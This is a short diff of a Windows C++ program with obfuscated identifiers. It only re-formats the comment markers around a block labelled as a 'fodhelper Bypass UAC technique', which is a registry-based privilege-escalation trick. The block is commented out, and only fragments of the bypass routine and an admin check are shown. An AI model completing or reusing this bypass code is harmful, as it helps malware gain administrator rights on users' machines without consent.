@@ -5,8 +5,7 @@
 #include <shlobj.h>
 #include <string>
 // fodhelper Bypass UAC technique (commented out)
-/*
-void mason__xa() {
+/* void mason__xa() {
     HKEY mason__xb;
     wchar_t mason__xc[MAX_PATH];
     GetModuleFileNameW(NULL, mason__xc, MAX_PATH);
@@ -31,8 +30,7 @@ bool mason__xg() {
         FreeSid(mason__xj);
     }
     return mason__xh; 
-}
-*/
+} */
 int WINAPI WinMain(HINSTANCE mason__xk, HINSTANCE mason__xl, LPSTR mason__xm, int mason__xn) {
      // if (!mason__xg()) {
     //    mason__xa();
